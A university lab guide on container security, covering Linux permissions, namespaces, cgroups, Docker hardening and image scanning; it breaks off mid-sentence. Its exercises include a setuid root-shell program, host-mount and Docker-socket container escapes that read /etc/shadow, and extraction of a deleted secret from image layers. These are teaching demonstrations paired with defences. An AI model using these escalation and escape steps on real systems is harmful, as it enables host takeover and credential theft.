# Securing Containers: Laboratory Part


**Author:** Anargyros Tsadimas

**Role:** Assistant Professor, DevOps & Software Engineer

**Scope:** 5-Day study mission program
for Efrei MSc students
20/4/2026-24/4/2026

**Latest version:** https://github.com/tsadimasteaching/efrei/blob/main/Lab.md

---

## Contents

* [Prerequisites](#prerequisites)
* [Part 1: Linux Fundamentals](#part-1-linux-fundamentals)
    * [Explore setuid](#explore-setuid)
    * [Explore Linux Capabilities](#explore-linux-capabilities)
    * [Introduction to Containers and Namespaces](#introduction-to-containers-and-namespaces)
    * [Exploring and Using Linux Control Groups (cgroups v2)](#exploring-and-using-linux-control-groups-cgroups-v2)
    * [Exercise: Create an isolated environment without Docker](#exercise-create-an-isolated-environment-without-docker)
* [Part 2: Containers Threat Modeling and Attack Surface](#part-2-containers-threat-modeling-and-attack-surface)
    * [Run a vulnerable container](#run-a-vulnerable-container)
    * [Simulate privilege escalation with host mounts](#simulate-privilege-escalation-with-host-mounts)
    * [Docker socket attack](#docker-socket-attack)
    * [Lab: Attacker's Mindset with amicontained](#lab-attackers-mindset-with-amicontained)
* [Part 3: Runtime Hardening](#part-3-runtime-hardening)
    * [Capabilities](#capabilities)
    * [Seccomp](#seccomp)
    * [AppArmor](#apparmor)
    * [Hardening Docker Compose](#hardening-docker-compose)
* [Part 4: Secure Image Build and Scanning](#part-4-secure-image-build-and-scanning)
    * [Understanding OverlayFS (Docker's Storage Driver)](#understanding-overlayfs-dockers-storage-driver)
    * [Compare Ubuntu vs Alpine base images](#compare-ubuntu-vs-alpine-base-images)
    * [Build and scan a deliberately vulnerable image](#build-and-scan-a-deliberately-vulnerable-image)
    * [Apply security rules to a real application](#apply-security-rules-to-a-real-application)
    * [Inspect image layers with Dive](#inspect-image-layers-with-dive)
    * [Exercise: Prove that "deleting isn't removing" in OverlayFS](#exercise-prove-that-deleting-isnt-removing-in-overlayfs)
* [Part 5: Security Tools](#part-5-security-tools)
    * [eBPF (Extended Berkeley Packet Filter)](#ebpf-extended-berkeley-packet-filter)
    * [Tetragon](#tetragon)
    * [Explore Tetragon](#explore-tetragon)
    * [Create custom tracing policies](#create-custom-tracing-policies)
    * [Detect shell spawned in containers](#detect-shell-spawned-in-containers)
    * [Full-circle: Detect the Part 2 attacks with Tetragon](#full-circle-detect-the-part-2-attacks-with-tetragon)
    * [Exercise: Monitor a real application with Tetragon](#exercise-monitor-a-real-application-with-tetragon)
    * [Docker Bench for Security](#docker-bench-for-security)
* [Part 6: Sandboxing](#part-6-sandboxing)
    * [Rootless Docker](#rootless-docker)
    * [Understanding: Rootless mode vs userns-remap](#understanding-rootless-mode-vs-userns-remap)

---

## Prerequisites

To follow the exercises in this guide, ensure you have the following setup:

* **Docker Engine:** [Installation Guide](https://docs.docker.com/engine/install/)
* **Security Tools:**
    * `strace`: [Install Guide](https://ioflood.com/blog/install-strace-command-linux/)
    * `grype`: [GitHub](https://github.com/anchore/grype)
    ```bash
    curl -sSfL https://get.anchore.io/grype | sudo sh -s -- -b /usr/local/bin
    ```
    * `trivy`: [GitHub](https://github.com/aquasecurity/trivy)
    * `dive`: [GitHub](https://github.com/wagoodman/dive)

    ```bash
    DIVE_VERSION=$(curl -sL "https://api.github.com/repos/wagoodman/dive/releases/latest" | grep '"tag_name":' | sed -E 's/.*"v([^"]+)".*/\1/')
    curl -fOL "https://github.com/wagoodman/dive/releases/download/v${DIVE_VERSION}/dive_${DIVE_VERSION}_linux_amd64.deb"
    sudo apt install ./dive_${DIVE_VERSION}_linux_amd64.deb
    ```
    * `amicontained`: [GitHub](https://github.com/genuinetools/amicontained)
* **Environment:** VirtualBox with Ubuntu Server (LTS 24.04.2), 4GB RAM, 2 CPUs.


---

## Part 1: Linux Fundamentals

### Unix Permissions, setuid, and setgid

Linux file permissions follow a three-group model: **owner**, **group**, and **others**. Each group can have **read** (`r`), **write** (`w`), and **execute** (`x`) permissions:

```
- r w x r w x r w x
|  |       |       |
|  |       |       +-- Read, write, and execute for all other users
|  |       +---------- Read, write, and execute for group owner
|  +------------------ Read, write, and execute for file owner
+--------------------- File type (- = regular, d = directory)
```

Numeric (octal) notation: each permission has a value — `r=4`, `w=2`, `x=1`. For example, `754` means:
- **7** (owner): rwx = 4+2+1
- **5** (group): r-x = 4+0+1
- **4** (others): r-- = 4+0+0

Beyond the standard rwx bits, Linux has three **special permission bits**:

**setuid (Set User ID)** — When set on an executable, the process runs with the **file owner's** privileges, not the caller's. The classic example is `/usr/bin/passwd`:

```bash
$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 /usr/bin/passwd
```

The `s` in the owner's execute position (`rws`) means setuid is active. Any user who runs `passwd` temporarily becomes root — which is necessary because only root can write to `/etc/shadow`. You set it with `chmod 4755` (the leading `4` enables setuid).

**setgid (Set Group ID)** — When set on an executable, the process runs with the **file group's** privileges. When set on a **directory**, new files created inside inherit the directory's group (instead of the creator's default group). This is useful for shared project directories.

```bash
$ ls -l /usr/bin/wall
-rwxr-sr-x 1 root tty 19024 /usr/bin/wall
```

The `s` in the group's execute position means setgid is active. You set it with `chmod 2755` (the leading `2` enables setgid).

**Sticky bit** — When set on a directory, only the file owner (or root) can delete or rename files inside, even if others have write permission. The classic example is `/tmp`:

```bash
$ ls -ld /tmp
drwxrwxrwt 26 root root 1191936 /tmp
```

The `t` at the end indicates the sticky bit. Without it, any user with write access to `/tmp` could delete anyone else's files. You set it with `chmod 1777` (the leading `1` enables sticky bit).

**Security implications:** setuid is a common privilege escalation vector. If you set setuid on a shell (e.g., bash), any user who runs it gets a root shell. Container image scanners (like Trivy) flag files with the setuid bit. You can prevent setuid escalation in Docker with `--no-new-privileges`.

### Explore setuid

setuid allows a user to execute a binary with the permissions of the file owner (e.g., root).

**1. Create `rootshell.c`**

```bash
cat > rootshell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    printf("[+] Current UID: %d\n", getuid());
    printf("[+] Switching to /bin/sh as root...\n");
    setuid(0); // ensure we become root
    system("/bin/sh");
    return 0;
}
EOF
```

**2. Compile and set permissions**

```bash
gcc -o rootshell rootshell.c
sudo chown root:root rootshell
sudo chmod 4755 rootshell
ls -l rootshell
```

**3. Execution**

Running `./rootshell` as a normal user will result in a root prompt (`#`).

### Explore Linux Capabilities

Capabilities divide root privileges into smaller units.

**1. Create `filefixer.c`**

```bash
cat > filefixer.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <filename>\n", argv[0]);
        return 1;
    }
    const char *filename = argv[1];
    if (chown(filename, 969, 969) != 0) {
        perror("chown failed");
        return 1;
    }
    printf("Ownership changed to UID 969 and GID 969.\n");
    return 0;
}
EOF
```

**2. Test and Grant Capability**

```bash
gcc -o filefixer filefixer.c
touch file1
./filefixer file1 # Fails
sudo setcap 'cap_chown=+ep' ./filefixer
./filefixer file1 # Succeeds
getcap ./filefixer

```

### Introduction to Containers and Namespaces

Start a container

```bash
docker run -it --rm alpine sh
```

Inspect namespaces inside container:

```bash
ls -l /proc/1/ns/
```

Find the process id of the sh from the host

```bash
sudo lsns | grep $(pidof sh)
```

Use unshare to simulate isolated environments


```bash
sudo unshare --mount --uts --ipc --net --pid --fork sh
hostname spiderman
```

**Breaking down the command:**

| Part | Meaning |
|---|---|
| `sudo` | Run as root — creating namespaces requires `CAP_SYS_ADMIN` |
| `unshare` | Linux utility that creates new namespaces and runs a program in them |
| `--mount` | New **Mount namespace** — mounts/unmounts inside won't affect the host |
| `--uts` | New **UTS namespace** — allows a separate hostname and domain name |
| `--ipc` | New **IPC namespace** — isolates shared memory, semaphores, message queues |
| `--net` | New **Network namespace** — gets its own network stack (interfaces, routes, iptables) |
| `--pid` | New **PID namespace** — processes inside start from PID 1 |
| `--fork` | Fork before executing the command — required with `--pid` so the new process becomes PID 1 in the new namespace |
| `sh` | The shell to run inside the isolated namespaces |

> **Note:** Without `--fork`, the `sh` process would retain its original PID from the parent namespace and `/proc` would not work correctly inside the new PID namespace.

You enter a new UTS (hostname) namespace, but unless you explicitly set a new hostname, it defaults to inheriting the current hostname (from the parent/host).


So the UTS namespace is isolated, but you haven't changed the hostname yet — so it looks the same until you modify it.


### Exploring and Using Linux Control Groups (cgroups v2)

Cgroups manage resource limits (CPU, Memory, I/O) for groups of processes. In cgroups v2, all controllers are unified under a single hierarchy at `/sys/fs/cgroup/`.

**1. Check cgroup version and mount status**

```bash
mount | grep cgroup
```

You can also confirm the filesystem type:

```bash
stat -fc %T /sys/fs/cgroup/
```

If it returns `cgroup2fs`, you are running cgroups v2.

**2. Create a new memory-limited cgroup**

```bash
sudo mkdir /sys/fs/cgroup/my_cgroup
```

List its contents to see the available controllers:

```bash
ls -l /sys/fs/cgroup/my_cgroup
```

Set a memory limit of 100MB:

```bash
echo $((100*1024*1024)) | sudo tee /sys/fs/cgroup/my_cgroup/memory.max
```

Disable swap for this cgroup (otherwise processes swap out instead of being OOM-killed):

```bash
echo 0 | sudo tee /sys/fs/cgroup/my_cgroup/memory.swap.max
```

Confirm the limits were applied:

```bash
cat /sys/fs/cgroup/my_cgroup/memory.max
```

**3. Create an isolated namespace and associate it with the cgroup**

Launch a new shell with an isolated PID and mount namespace:

```bash
sudo unshare --pid --mount --fork bash
```

Get the PID of the current bash process:

```bash
ps -ef | grep bash
```

Add this process (and any children it spawns) to the cgroup:

```bash
echo <PID> | sudo tee /sys/fs/cgroup/my_cgroup/cgroup.procs
```

**4. Test the memory limit**

First, try a small allocation that fits within the limit:

```bash
python3 -c "a = 'a' * 10 * 1024 * 1024; print('10MB allocated OK')"
```

This succeeds because 10MB is well under the 100MB limit. Now try allocating more than the limit:

```bash
python3 -c "a = 'a' * 200 * 1024 * 1024; print('200MB allocated OK')"
```

The process will be killed by the OOM killer because 200MB exceeds the 100MB cgroup limit.

Verify the OOM kill from the host:

```bash
sudo dmesg | tail
```

You should see a message like `Memory cgroup out of memory: Killed process ...`.

**5. Cleanup**

```bash
sudo rmdir /sys/fs/cgroup/my_cgroup
```

### Exercise: Create an isolated environment without Docker

**1. Create the directory structure:**

```bash
mkdir ~/sandbox
cd ~/sandbox
mkdir rootfs
cd rootfs
```

**2. Fetch BusyBox:**

BusyBox is a tiny, single-binary version of many standard Unix commands. You make it executable so it can act like tools such as `sh`, `ls`, `cat`, etc.

```bash
wget https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox
chmod +x busybox
```

**3. Create the Linux filesystem:**

```bash
mkdir bin proc dev sys tmp
mv busybox bin/
```

**4. Create symlinks for common commands:**

```bash
cd bin
for cmd in sh ls ps echo cat mount uname hostname top id; do ln -s busybox $cmd; done
cd ..
```

This creates symbolic links like `/bin/sh → busybox`, so when BusyBox sees it's being called as `sh`, it acts like a shell. This is how BusyBox mimics multiple commands using one binary.

**5. Enter the isolated environment:**

`chroot` (change root) changes the apparent root directory (`/`) for a process and its children. After `chroot ~/sandbox/rootfs`, the process sees `~/sandbox/rootfs` as `/` — it cannot access files outside that directory tree. This was the original Unix "container" mechanism before namespaces existed.

However, `chroot` alone is **not secure**: a root process can escape using `mkdir`+`chroot`+`cd` tricks, and it doesn't isolate PIDs, network, or other resources. That's why we combine it with `unshare` to add proper namespace isolation.

```bash
sudo unshare --mount --uts --ipc --net --pid --fork chroot ~/sandbox/rootfs /bin/sh
```

This combines `unshare` (namespace isolation) with `chroot` (filesystem isolation):

| Part | Meaning |
|---|---|
| `unshare --mount` | Separate mount table |
| `--uts` | Isolate hostname/domain |
| `--ipc` | Isolate System V IPC |
| `--net` | Isolate network |
| `--pid` | Isolate process tree (you're PID 1 here) |
| `--fork` | Fork a new process in that namespace |
| `chroot ~/sandbox/rootfs` | Changes root to the fake root |
| `/bin/sh` | Starts a shell inside |

You're now inside a lightweight container. First, set the PATH since the environment is minimal:

```bash
export PATH=/bin
```

**6. Mount `/proc`:**

Without this, commands like `ps` or `top` won't work. This provides the `/proc` pseudo-filesystem which reports process info.

```bash
mount -t proc proc /proc
```

Now try running some commands:

```bash
ps
hostname
id
uname -a
```

**7. Cleanup:**

Exit the chroot:

```bash
exit
```

Since we used `--mount` (a separate mount namespace), the `/proc` mount is automatically cleaned up when the namespace is destroyed — no need to manually unmount.

---

## Part 2: Containers Threat Modeling and Attack Surface

### Run a vulnerable container

```bash
docker run -it --rm --name vuln --privileged debian bash
```

Install and start an SSH server inside the container:

```bash
apt update && apt install openssh-server -y
service ssh start
```

From the host, port scan the container:

```bash
nmap $(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' vuln)
```

### Simulate privilege escalation with host mounts

**Privileged Mode:** `--privileged` grants the container access to all host devices.

**Host Mounts:** Mounting `/` into a container allows full host access.

```bash
docker run -v /:/mnt -it debian bash
ls /mnt/root
```

### Docker socket attack

The Docker socket (`/var/run/docker.sock`) is the API endpoint that the Docker CLI uses to communicate with the Docker daemon. If you mount it into a container, that container can control Docker on the host — including creating new privileged containers, accessing the host filesystem, or even replacing running containers.

This is one of the **most common real-world misconfigurations**. Many CI/CD tools, monitoring agents, and deployment tools request socket access, and granting it is equivalent to giving root on the host.

**1. Mount the Docker socket into a container:**

```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock -it docker sh
```

You're now inside a container that has the `docker` CLI and access to the host's Docker daemon.

**2. From inside the container, take over the host:**

```bash
docker run -v /:/host -it alpine chroot /host
```

You now have a **root shell on the host** — you can read `/etc/shadow`, install packages, modify systemd services, etc. All from inside what was supposed to be an isolated container.

**3. Verify host access:**

```bash
cat /etc/hostname
cat /etc/shadow
ls /root
exit
exit
```

> **Takeaway:** Never mount the Docker socket into a container unless absolutely necessary. If you must (e.g., for CI/CD), use read-only mounts (`-v /var/run/docker.sock:/var/run/docker.sock:ro`) and restrict the container's capabilities. Better alternatives include using Docker's TCP API with TLS mutual authentication, or tools like [Sysbox](https://github.com/nestybox/sysbox) that provide Docker-in-Docker without socket access.

### Lab: Attacker's Mindset with amicontained

`amicontained` is a tool that shows you the runtime security configuration of a container from the inside -- capabilities, namespaces, seccomp status, and more.

#### Step 1: Run in a default container

```bash
docker run --rm jess/amicontained amicontained
```

Observe the output:
- Which capabilities are granted?
- Is seccomp filtering active?
- Which namespaces are enabled?

#### Step 2: Run in a privileged container

```bash
docker run --rm --privileged jess/amicontained amicontained
```

Compare with Step 1:
- Notice that **all capabilities** are now granted
- Seccomp is **disabled**
- Additional devices and host resources are accessible

#### Step 3: Run in a hardened container

```bash
docker run --rm \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --security-opt=no-new-privileges \
  --read-only \
  --user 1000:1000 \
  jess/amicontained amicontained
```

Compare with Steps 1 and 2:
- Only `NET_BIND_SERVICE` capability remains
- Seccomp is **active**
- `no-new-privileges` prevents privilege escalation

#### Step 4: Compare side by side

Create a simple comparison table from your observations:

| Feature | Default | Privileged | Hardened |
|---|---|---|---|
| Capabilities | ~14 default | ALL (40+) | 1 (NET_BIND_SERVICE) |
| Seccomp | Enabled (default profile) | Disabled | Enabled (default profile) |
| no-new-privileges | No | No | Yes |
| Namespaces | pid, net, mnt, uts, ipc | pid, net, mnt, uts, ipc | pid, net, mnt, uts, ipc |

> **Takeaway:** A default container is not secure. A privileged container is wide open. Always harden your containers by dropping capabilities and enabling security options.

---

## Part 3: Runtime Hardening

### Capabilities

Traditionally, Linux divided processes into two categories: **privileged** (UID 0 / root) with full access, and **unprivileged** (everyone else). This all-or-nothing model is dangerous — if a process needs just one root power (e.g., binding to port 80), it gets *all* root powers.

**Linux capabilities** break root privileges into ~40 distinct units. Each capability grants a specific power:

| Capability | What it allows |
|---|---|
| `CAP_NET_BIND_SERVICE` | Bind to ports below 1024 |
| `CAP_SYS_ADMIN` | Mount filesystems, configure namespaces, etc. (the "new root") |
| `CAP_NET_RAW` | Use raw sockets (ping, packet sniffing) |
| `CAP_SYS_PTRACE` | Trace/debug other processes |
| `CAP_DAC_OVERRIDE` | Bypass file read/write/execute permission checks |
| `CAP_CHOWN` | Change file ownership |
| `CAP_KILL` | Send signals to any process |
| `CAP_SETUID` / `CAP_SETGID` | Change process UID/GID |

Docker grants ~14 capabilities by default — enough for most applications but far less than full root. The principle of **least privilege** says: drop all capabilities, then add back only what your application needs.

Capabilities are tracked in three sets:
- **Bounding set** — upper limit of capabilities the process can ever gain
- **Effective set** — capabilities currently active
- **Permitted set** — capabilities the process is allowed to activate

**View default capabilities:**

```bash
docker run --rm alpine sh -c "apk add --no-cache libcap-utils && capsh --print"
```

You'll see ~14 capabilities are granted by default including `cap_chown`, `cap_dac_override`, `cap_fowner`, `cap_kill`, `cap_setgid`, `cap_setuid`, `cap_net_bind_service`, `cap_net_raw`, `cap_sys_chroot`, `cap_mknod`, `cap_audit_write`, `cap_setfcap`.

**Drop all capabilities:**

```bash
docker run --rm --cap-drop=ALL alpine sh -c "apk add --no-cache libcap-utils && capsh --print"
```

Now `Current:` and `Bounding set` will be empty — all capabilities are removed.

**Add back only what's needed:**

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE alpine sh
```

### Seccomp

**Seccomp** (Secure Computing Mode) is a Linux kernel feature that filters which **system calls** a process can make. Since every interaction with the kernel goes through syscalls (`read`, `write`, `open`, `execve`, `mount`, `ptrace`, etc.), restricting them is a powerful defense layer.

There are two modes:
- **Strict mode** — only allows `read`, `write`, `exit`, and `sigreturn`. Almost nothing works.
- **Filter mode** (seccomp-bpf) — uses BPF programs to allow/deny specific syscalls. This is what Docker uses.

Docker applies a **default seccomp profile** that blocks ~60 dangerous syscalls out of ~300+ total, including:

| Blocked syscall | Risk if allowed |
|---|---|
| `mount` / `umount` | Mount host filesystems from inside the container |
| `reboot` | Reboot the host |
| `kexec_load` | Load a new kernel |
| `ptrace` | Debug/inspect other processes |
| `personality` | Change execution domain (used in exploits) |
| `unshare` | Create new namespaces (container escape) |

You can create **custom profiles** to further restrict or relax the defaults. Profiles are JSON files that specify an action per syscall.

> **Capabilities vs Seccomp:** Capabilities control *what privileges* a process has. Seccomp controls *what kernel functions* it can call. They are complementary — use both for defense in depth.

**1. Create a seccomp profile:**

```bash
cat > seccomp.json << 'EOF'
{
    "defaultAction": "SCMP_ACT_ALLOW",
    "syscalls": [
        {
            "names": ["ptrace"],
            "action": "SCMP_ACT_ERRNO"
        }
    ]
}
EOF
```

This profile allows all syscalls by default but **blocks `ptrace`** — used by `strace` and debuggers. Blocking it prevents processes from inspecting or modifying the behavior of other processes.

**2. Run a container with the profile:**

```bash
docker run --rm --security-opt seccomp=seccomp.json alpine sh -c "apk add --no-cache strace && strace -e open ls"
```

`strace` will fail because `ptrace` is blocked.

### AppArmor

**AppArmor** (Application Armor) is a Linux Security Module (LSM) that restricts what individual programs can do — which files they can read/write, which network operations they can perform, and which capabilities they can use. It works alongside capabilities and seccomp as an additional layer of defense.

**How it works:**
- AppArmor uses **profiles** — text files that define access rules for a specific program
- Profiles are loaded into the kernel and enforced at the LSM level
- Each profile can be in one of two modes:
  - **Enforce** — violations are blocked and logged
  - **Complain** — violations are logged but allowed (useful for profile development)

**AppArmor vs SELinux:**

| Feature | AppArmor | SELinux |
|---|---|---|
| Model | Path-based (rules reference file paths) | Label-based (rules reference security labels) |
| Complexity | Simpler to write and understand | More powerful but steeper learning curve |
| Default on | Ubuntu, Debian, SUSE | RHEL, Fedora, CentOS |
| Profile scope | Per-program | System-wide mandatory access control |

**Docker and AppArmor:** Docker automatically applies a default AppArmor profile (`docker-default`) to all containers. This profile prevents containers from writing to `/proc` and `/sys`, loading kernel modules, mounting filesystems, and accessing raw sockets. You can override it with custom profiles using `--security-opt apparmor=<profile-name>`.

> **Defense in depth:** Capabilities limit *what powers* a process has. Seccomp limits *what syscalls* it can make. AppArmor limits *what resources* (files, network, etc.) it can access. Together, they form three complementary layers of runtime hardening.

**1. Install AppArmor:**

```bash
sudo apt install apparmor apparmor-profiles apparmor-utils
sudo apparmor_status
```

**2. Create a test script (`test.sh`):**

```bash
cat > test.sh << 'EOF'
#!/bin/sh
echo "test" > /etc/testfile
EOF
chmod +x test.sh
```

**3. Create a Dockerfile (`apparmor.Dockerfile`):**

```bash
cat > apparmor.Dockerfile << 'EOF'
FROM alpine
COPY test.sh /test.sh
RUN chmod +x /test.sh
CMD ["/test.sh"]
EOF
docker build -t apparmor-test -f apparmor.Dockerfile .
```

**4. Create a restrictive AppArmor profile:**

Save the following as `/etc/apparmor.d/docker-deny-write-etc`:

```
#include <tunables/global>

/usr/bin/docker-default {
  profile docker-deny-write-etc flags=(attach_disconnected) {
    file,
    network,
    capability,

    # Deny writing to /etc
    deny /etc/** w,

    # Required for Docker
    mount,
    signal,
    ptrace,
  }
}
```

**Line-by-line explanation:**

| Line | Meaning |
|---|---|
| `#include <tunables/global>` | Includes global variable definitions (e.g., `@{HOME}`, `@{PROC}`). Standard boilerplate for all AppArmor profiles. |
| `/usr/bin/docker-default {` | The **parent profile** — this attaches to the Docker default binary path. It acts as a container for the nested child profile. |
| `profile docker-deny-write-etc` | Defines a **named child profile** called `docker-deny-write-etc`. This is the actual profile applied to the container. |
| `flags=(attach_disconnected)` | Allows the profile to work on processes whose namespace path is disconnected from the initial namespace — **required for Docker containers** because they run in separate mount namespaces. Without this flag, AppArmor would refuse to confine the container. |
| `file,` | Grants **all file operations** by default (read, write, execute, create, delete). Specific `deny` rules below override this. |
| `network,` | Allows **all network operations** (TCP, UDP, raw sockets, etc.). |
| `capability,` | Allows **all Linux capabilities**. The container's capabilities are already restricted by Docker — AppArmor doesn't need to duplicate that. |
| `deny /etc/** w,` | **Explicitly denies** write access to anything under `/etc/`. The `**` glob matches all files and subdirectories recursively. The `w` permission means write. `deny` rules always take precedence over allow rules — even though `file,` allows everything, this blocks `/etc/` writes. |
| `mount,` | Allows mount operations — needed by Docker for setting up the container's filesystem (overlay mounts, `/proc`, `/dev`, etc.). |
| `signal,` | Allows sending and receiving signals — needed for Docker to manage container processes (`SIGTERM`, `SIGKILL`, etc.). |
| `ptrace,` | Allows process tracing — needed by Docker for process management and health checks. |

> **Key concept:** AppArmor uses a **default-deny with explicit allows** or **default-allow with explicit denies** model. This profile uses the latter — it allows everything (`file, network, capability`) and then specifically denies writing to `/etc/`. The `deny` keyword is special: it **always wins** over allow rules and cannot be overridden.

You can download it:
```bash
wget https://raw.githubusercontent.com/tsadimasteaching/efrei/refs/heads/main/docker-deny-write-etc
sudo cp docker-deny-write-etc /etc/apparmor.d/
```

**5. Load and test the profile:**

```bash
sudo mount -t securityfs securityfs /sys/kernel/security
sudo apparmor_parser -r /etc/apparmor.d/docker-deny-write-etc
sudo apparmor_status
```

**6. Run the container with AppArmor enforcement:**

```bash
docker run --rm -it --security-opt apparmor:/usr/bin/docker-default//docker-deny-write-etc apparmor-test
```

The write to `/etc/testfile` will be **denied** by AppArmor.

### Hardening Docker Compose

In production, most applications use Docker Compose. All the runtime hardening options from this section can be applied in `docker-compose.yaml`. This exercise creates a hardened Compose file for a simple web application.

**1. Create a hardened `docker-compose.yaml`:**

```bash
cat > docker-compose-hardened.yaml << 'EOF'
services:
  web:
    image: nginx:alpine
    ports:
      - "8080:80"
    # Drop all capabilities, add only what nginx needs
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
      - CHOWN
      - SETGID
      - SETUID
    # Read-only root filesystem
    read_only: true
    # Temp directories for nginx to write to
    tmpfs:
      - /tmp
      - /var/cache/nginx
      - /var/run
    # Prevent privilege escalation
    security_opt:
      - no-new-privileges:true
    # Resource limits
    deploy:
      resources:
        limits:
          memory: 128M
          cpus: "0.5"
        reservations:
          memory: 64M
    # Limit number of processes (prevent fork bombs)
    pids_limit: 50
    # No access to host network
    networks:
      - app-net

networks:
  app-net:
    driver: bridge
EOF
```

**2. Run and verify the hardened container:**

```bash
docker compose -f docker-compose-hardened.yaml up -d
```

**3. Verify the hardening is applied:**

```bash
docker inspect $(docker compose -f docker-compose-hardened.yaml ps -q web) | grep -A 5 CapDrop
docker exec $(docker compose -f docker-compose-hardened.yaml ps -q web) sh -c "touch /test" 2>&1 || echo "Read-only filesystem: PASS"
curl -s http://localhost:8080 | head -5
```

**4. Compare with an unhardened version:**

| Setting | Unhardened (default) | Hardened |
|---|---|---|
| Capabilities | ~14 default | Only NET_BIND_SERVICE + 3 |
| Filesystem | Read-write | Read-only + tmpfs |
| Memory limit | Unlimited | 128MB |
| CPU limit | Unlimited | 0.5 cores |
| PID limit | Unlimited | 50 |
| Privilege escalation | Allowed | Blocked |

**5. Cleanup:**

```bash
docker compose -f docker-compose-hardened.yaml down
```

> **Takeaway:** Always apply security options in your Compose files. In production, treat `docker-compose.yaml` as a security policy — every service should have `cap_drop: [ALL]`, `read_only: true`, `security_opt: [no-new-privileges:true]`, and resource limits.

---

## Part 4: Secure Image Build and Scanning

### Understanding OverlayFS (Docker's Storage Driver)

Docker uses **overlay2** as its default storage driver, built on the Linux kernel's **OverlayFS** — a union filesystem that merges multiple directory layers into a single view:

- **Lower layers** (read-only): each `RUN`, `COPY`, `ADD` instruction in a Dockerfile creates a new layer
- **Upper layer** (read-write): per-container; writes use **copy-on-write** (CoW) — the file is copied from a lower layer before modification
- **Merged view**: what the container actually sees as its filesystem

**1. Check your storage driver:**

```bash
docker info | grep "Storage Driver"
```

**2. Inspect image layers:**

```bash
docker pull nginx:alpine
docker inspect nginx:alpine --format '{{json .RootFS.Layers}}' | python3 -m json.tool
```

Each SHA256 hash is a layer. Layers are shared across containers using the same image.

**3. See the overlay mount of a running container:**

```bash
docker run -d --name overlay-test alpine sleep 300

# View the overlay mount details from inside the container
docker exec overlay-test cat /proc/1/mountinfo | head -1
```

You'll see a line like:
```
... / rw,relatime - overlay overlay rw,lowerdir=.../snapshots/412/fs:.../snapshots/179/fs,upperdir=.../snapshots/413/fs,...
```

This shows the **lowerdir** (read-only image layers), **upperdir** (container's writable layer), and **workdir** (internal bookkeeping).

```bash
# Write a file and observe that it only exists in the container layer
docker exec overlay-test sh -c "echo hello > /test.txt"
docker exec overlay-test cat /test.txt

# The file lives in the upper (writable) layer — image layers are untouched
docker diff overlay-test
```

`docker diff` shows `A /test.txt` (Added) — confirming the write went only to the container's upper layer.

**4. Demonstrate layer leaking (secrets persist in layers):**

```bash
cat > layer-leak.Dockerfile << 'EOF'
FROM alpine
RUN echo "DB_PASSWORD=supersecret" > /secret.txt
RUN rm /secret.txt
EOF
docker build -t layer-leak -f layer-leak.Dockerfile .
docker history layer-leak
```

Even though `/secret.txt` was deleted, the layer that created it still exists. You can extract it:

```bash
docker save layer-leak -o layer-leak.tar
mkdir layer-leak-extracted && tar -xf layer-leak.tar -C layer-leak-extracted

# List each layer's contents — look for secret.txt
for layer in $(python3 -c "
import json
m = json.load(open('layer-leak-extracted/manifest.json'))
[print(l) for l in m[0]['Layers']]
"); do
  echo "=== $layer ==="
  tar -tf "layer-leak-extracted/$layer" | head -5
done
```

You'll see `secret.txt` in one layer and `.wh.secret.txt` (the whiteout marker) in the next. Extract the secret:

```bash
# Find which layer has the secret and extract it
for layer in $(python3 -c "
import json; m = json.load(open('layer-leak-extracted/manifest.json'))
[print(l) for l in m[0]['Layers']]
"); do
  tar -tf "layer-leak-extracted/$layer" 2>/dev/null | grep -q secret.txt && \
    echo "Found in: $layer" && \
    tar -xf "layer-leak-extracted/$layer" -O secret.txt 2>/dev/null
done
```

> **Takeaway:** Never put secrets in any Dockerfile layer — even if you delete them in a later layer, they remain in the image history. Use multi-stage builds, `.dockerignore`, or Docker secrets instead.

**5. Cleanup:**

```bash
docker stop overlay-test && docker rm overlay-test
docker rmi layer-leak
rm -rf layer-leak-extracted layer-leak.tar layer-leak.Dockerfile
```

### Compare Ubuntu vs Alpine base images

**Build a Ubuntu-based image (`mypythonubuntu.Dockerfile`):**

```bash
cat > mypythonubuntu.Dockerfile << 'EOF'
FROM ubuntu
RUN apt update -y && apt install curl python3 -y
EOF
docker build -t mypythonubuntu -f mypythonubuntu.Dockerfile .
```

**Build an Alpine-based image:**

```bash
cat > myalpine.Dockerfile << 'EOF'
FROM alpine
RUN apk add curl python3
EOF
docker build -t myalpine -f myalpine.Dockerfile .
```

**Compare image sizes and vulnerabilities:**

```bash
docker images | grep -E "mypythonubuntu|myalpine"
grype mypythonubuntu
grype myalpine
```

### Build and scan a deliberately vulnerable image

Download the vulnerable Dockerfile:

```bash
wget https://raw.githubusercontent.com/tsadimasteaching/efrei/refs/heads/main/vuln.Dockerfile
```

This image intentionally includes: running as root, SUID binaries, hardcoded secrets, and a demo attacker user.

```bash
docker build -t insecure-image -f vuln.Dockerfile .
```

**Scan with Trivy (vulnerabilities, misconfigurations, and secrets):**

```bash
trivy image --security-checks vuln,config,secret insecure-image
```

### Apply security rules to a real application

Clone the FastAPI application:

```bash
git clone https://github.com/tsadimasteaching/fastapi-intro.git
cd fastapi-intro
```

**Build and scan the unhardened image:**

```bash
docker build -f no-rules.Dockerfile -t fastapi.Dockerfile .
trivy image --security-checks vuln,config,secret no-rules
# or you can get the count of findings for each category
trivy image --scanners vuln,config,secret --format json no-rules | \
jq '.Results[]? | .Vulnerabilities[]?, .Misconfigurations[]?, .Secrets[]? | .Severity' | \
sort | uniq -c
```

**Apply the full set of security rules:**

1. Use minimal base images (Alpine)
2. Pin image versions
3. Run as non-root user
4. Use multi-stage builds
5. Use `.dockerignore`
6. Avoid hardcoding secrets
7. Set proper file permissions
8. Enable read-only filesystem
9. Drop all capabilities

**Build and scan the hardened image:**

Download the improved Dockerfile:

```bash
wget https://raw.githubusercontent.com/tsadimasteaching/fastapi-intro/refs/heads/main/fastapi-improved-updated.Dockerfile
```

This improved Dockerfile uses:
